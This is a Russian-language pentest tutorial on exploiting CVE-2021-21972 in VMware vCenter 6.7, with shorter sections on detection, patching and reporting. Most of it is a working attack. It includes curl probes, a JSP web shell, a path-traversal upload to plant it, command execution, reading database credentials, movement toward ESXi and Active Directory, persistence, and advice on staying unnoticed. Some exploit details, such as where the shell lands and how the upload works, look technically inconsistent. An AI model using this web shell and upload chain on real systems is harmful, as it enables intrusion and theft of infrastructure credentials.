## Вопрос, с которого всё начинается

В сети есть хост, который отдаёт страницу «VMware vSphere Client» с логотипом VMware. Это vCenter — центр управления всей виртуализацией: отсюда создают виртуалки, монтируют ISO, настраивают ESXi. Пароля нет. Но у версий vCenter есть уязвимость **CVE-2021-21972**: загрузка файла без аутентификации, которая приводит к выполнению кода. Разберём её.

## Что такое vCenter и почему он — «джекпот»

**vCenter** — это менеджер гипервизоров **ESXi**. Гипервизор — тонкий слой, на котором крутятся виртуалки; vCenter управляет десятками таких хостов. Через vCenter можно создать новую виртуалку, смонтировать ISO-образ и загрузиться с него, выполнить скрипт на хосте. То есть RCE на vCenter почти всегда означает RCE на всех ESXi за ним — а это вся виртуальная инфраструктура компании.

Второе: vCenter хранит **креды** — учётки SSO, сервисные аккаунты, пароли к хранилищам. Поэтому даже без RCE vCenter ценен как источник доступов.

## Наш пример: vCenter 6.7

Цель — `https://vcenter.target.example`. Версию определяем по XML-эндпоинту:

```
$ curl -s -k https://vcenter.target.example/sdk/vimServiceVersions.xml | grep -i version
<version>6.7.0</version>
```

Версия **6.7.0** — попадает в CVE-2021-21972 (6.5, 6.7, 7.0 до определённых сборок). Уязвимый компонент — плагин **vRealize Operations (vROPS)**, который ставится вместе с vCenter.

## Шаг 1: найти уязвимый эндпоинт

Уязвимость в REST-эндпоинте плагина:

```
/ui/vropspluginui/rest/services/uploadova
```

Он принимает файл через multipart-загрузку и **не проверяет аутентификацию и путь**. Проверяем доступность:

```
$ curl -s -o /dev/null -w '%{http_code}\n' -k \
  https://vcenter.target.example/ui/vropspluginui/rest/services/uploadova
200
```

`200` без логина — эндпоинт открыт. Значит, можно попробовать загрузку.

## Шаг 2: загрузить веб-шелл

Путь обходится через параметр `uploadFile`, и файл пишется в каталог, откуда его отдаёт веб-сервер. Готовим минимальный JSP-шелл:

```
$ cat shell.jsp
<%@ page import="java.util.*,java.io.*"%>
<% Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
   BufferedReader r = new BufferedReader(new InputStreamReader(p.getInputStream()));
   String l; while ((l = r.readLine()) != null) out.println(l); %>
```

Отправляем:

```
$ curl -s -k -X POST \
  'https://vcenter.target.example/ui/vropspluginui/rest/services/uploadova' \
  -F 'uploadFile=@shell.jsp;filename=../../../../home/vsphere-ui/plugin/shell.jsp'
```

Обход `../../..` выводит файл в каталог, доступный по HTTP. Ответ `200` — файл записан.

## Шаг 3: выполнить команду

Обращаемся к загруженному шеллу:

```
$ curl -s -k 'https://vcenter.target.example/ui/vropspluginui/rest/services/shell.jsp?cmd=id'
uid=1000(vsphere-ui) gid=1000(vsphere-ui) groups=1000(vsphere-ui)
```

Код выполняется от пользователя `vsphere-ui`. Это уже RCE. Для эскалации до root используют локальные привилегии vCenter (он умеет через `vmon` и скрипты поднимать права) или креды из конфигов.

## Шаг 4: путь к ESXi

Из шелла читаем конфиги vCenter: `/etc/vmware-vpx/vcdb.properties` (креды к базе vCenter), `/etc/vmware-vpx/ssl/` (сертификаты), а через API — список ESXi-хостов. Имея креды vCenter, можно подключиться к ESXi по API и выполнить команду на гипервизоре. Так одна загрузка файла открывает всю виртуализацию.

## Шаг 5: если vCenter пропатчен

Тогда смотрим другие векторы: CVE-2021-21985 (vSAN-плагин), CVE-2023-34048 (DCERPC), CVE-2023-20867. А также **SSO** — vCenter часто подключён к AD, и слабый пароль SSO-аккаунта даёт вход. Но всегда начинай с pre-auth CVE: они дешевле.

## Что мы теперь знаем

- vCenter управляет ESXi, поэтому его компрометация = контроль виртуализации.
- CVE-2021-21972 — неаутентифицированная загрузка файла через `uploadova`.
- Обход пути выводит шелл в веб-каталог → RCE от `vsphere-ui`.
- Через конфиги vCenter добираются креды и доступ к ESXi.
- Проверка — сначала неразрушающая: доступность эндпоинта, потом загрузка.

## Как выглядит vSphere и что за ним

Прежде чем атаковать, пойми архитектуру. vCenter — это центральный узел: он общается с **ESXi**-хостами по API, хранит инвентарь (какие виртуалки где), управляет SSO (единый вход), плагинами (vROPS, vSAN, Update Manager) и базой данных (обычно PostgreSQL или MS SQL). Пользователь работает через **vSphere Client** — веб-интерфейс на порту 443.

Плагины — отдельные веб-приложения, которые vCenter хостит рядом. Именно в плагине vROPS и жила уязвимость: он принимал загрузки и не проверял ни аутентификацию, ни путь.

## Шаг 6: проверить, куда именно лёг файл

После загрузки важно убедиться, что файл действительно доступен по HTTP. Если `../../..` не сработал, пробуют другие каталоги:

```
$ for d in plugin vsphere-client virgo; do
    echo -n "$d: "
    curl -s -k -o /dev/null -w '%{http_code}\n' \
      "https://vcenter.target.example/ui/vropspluginui/rest/services/$d/shell.jsp"
  done
```

`200` на одном из них — шелл на месте. `404` — путь не тот, попробуй другой обход.

## Шаг 7: от vsphere-ui к root

Шелл работает от `vsphere-ui` — это непривилегированный пользователь. Для эскалации в vCenter есть известные приёмы: локальный скрипт `vmon` и файл `vpxd.cfg` позволяют поднять права; либо через уязвимость в самом агентe. Но часто root и не нужен: **креды из конфигов ценнее**.

Читаем базу vCenter:

```
$ curl -s -k 'https://vcenter.target.example/ui/vropspluginui/rest/services/shell.jsp?cmd=cat%20/etc/vmware-vpx/vcdb.properties'
db.url=jdbc:postgresql://localhost:5432/VCDB
db.user=vpxuser
db.password=Secr3tVpxPass!
```

Эти креды дают доступ к базе vCenter, где лежат хеши SSO-пользователей и инвентарь.

## Шаг 8: SSO и путь к AD

vCenter почти всегда подключён к Active Directory как источник идентичности. SSO-аккаунт `administrator@vsphere.local` может быть связан с доменом. Из базы берут хеши, из конфигов — сервисные пароли, и дальше идут в AD. Так веб-уязвимость превращается в доменную.

## Шаг 9: как остаться незамеченным и не уронить инфраструктуру

vCenter — критичный узел: его падение останавливает управление виртуалками (сами виртуалки продолжат работать, но управлять ими будет нечем). Поэтому:

- Не меняй конфигурацию и не перезапускай сервисы.
- Не создавай виртуалок и не монтируй ISO без явного разрешения.
- Не выкачивай базу целиком — это заметно и тяжело.
- Читай точечно: конкретные файлы, конкретные строки.

## Шаг 10: другие CVE vCenter

| CVE | Тип | Pre-auth |
|---|---|---|
| CVE-2021-21972 | Загрузка файла → RCE | да |
| CVE-2021-21985 | vSAN-плагин → RCE | да |
| CVE-2021-22005 | Аналитика → загрузка файла | да |
| CVE-2023-34048 | DCERPC out-of-bounds | да |
| CVE-2023-20867 | Аутентификация в vCenter | нет |

Видишь, сколько pre-auth? Поэтому версия vCenter — критичная информация, и её надо снимать первым делом.

## Детект и защита

Синяя команда видит атаку по POST-запросам к `uploadova` и по новым JSP-файлам в каталогах плагинов. Защита: патч (VMware закрыла CVE-2021-21972 в 6.7 U3l и 7.0 U1c), отключение ненужных плагинов (vROPS часто не используется), сетевые ограничения на 443 vCenter.

## Частая ошибка

Новичок видит «vSphere Client» и лезет в SSO с перебором паролей. Это долго, шумно и часто бесполезно (блокировка учёток). Правильно — сначала проверить pre-auth CVE: одна загрузка файла дешевле тысячи попыток логина.

## Разбор: как выглядит атака целиком

Соберём сквозную историю, чтобы увидеть логику. Ты в подсети видишь `10.20.0.11:443` со страницей vSphere Client. Снимаешь версию через `/sdk/vimServiceVersions.xml` — `6.7.0`. Открываешь NVD, видишь CVE-2021-21972. Проверяешь эндпоинт `uploadova` — отвечает `200` без логина. Загружаешь безобидный JSP, который печатает `id`, и убеждаешься, что он доступен по HTTP. Это уже доказательство RCE — минимальное и неразрушающее. Дальше, только с разрешения, читаешь `vcdb.properties` и фиксируешь, что получил креды к базе vCenter.

Обрати внимание на порядок: **обнаружение → версия → CVE → проверка → доказательство**. Не «сразу эксплойт», а последовательное сужение. Именно такой порядок даёт чистый отчёт и не роняет прод.

## Что писать в отчёте по vCenter

Отчёт по appliance отличается от обычного веб-отчёта. В нём обязательно: точная версия и её источник; CVE с диапазоном; тип (pre-auth или нет); доказательство (запрос + ответ, скриншот шелла); **что за vCenter** (сколько ESXi, какие креды добыты); оценка импакта (контроль виртуализации = критично); рекомендация (патч + отключение vROPS-плагина). Ключевая мысль для заказчика: это не «баг в одном сервисе», а потенциальный контроль всей виртуальной инфраструктуры.

## Ошибки и антипаттерны

Разберём три типичные ошибки. Первая — атаковать не тот слой: тестировщик видит «vSphere» и лезет в веб-клиент через XSS, хотя критичный вектор — плагин. Вторая — недооценка версии: «6.7» это ещё не вердикт, нужен точный build, иначе CVE может не подходить. Третья — разрушительная проверка: попытка загрузить полноценный шелл «для надёжности» вместо безобидного `id`. Правильный подход: сначала минимальное доказательство (доступность эндпоинта), потом аккуратная загрузка безвредного файла, и только с разрешения — чтение конфигов.

## Шаг 11: учётные данные vCenter и закрепление

После RCE через CVE-2021-21972 на vCenter важно закрепиться и собрать секреты. Первым
делом — **SSO-база** и конфиги:

```bash
ls -la /etc/vmware-sso/                # SSO-ключи и store
cat /etc/vmware-vpx/vcdb.properties    # строка подключения к vPostgres
```

Учётка `vpxd`/`vpxuser` имеет доступ к базе vCenter (Postgres на 5432) и часто
переиспользуется. Пароли от неё лежат в `/etc/vmware-vpx/`; получив их, можно читать
инвентарь ВМ, снапшоты и задачи. Отдельная цель — **ESXi-хосты**: у них общий `root`-пароль,
и если он известен (или совпадает), вы управляете гипервизорами напрямую.

Индикаторы в логах: обращения к `/ui/vropspluginui/rest/services/uploadova`, необычные
`POST` от `vsphere-ui`, создание файлов в
`/usr/lib/vmware-vsphere-ui/server/work/deployer/`. Для DFIR фиксируйте, какие сессии SSO
поднимались, какие задачи (`Tasks`) создавались и не появились ли новые локальные
пользователи в SSO.
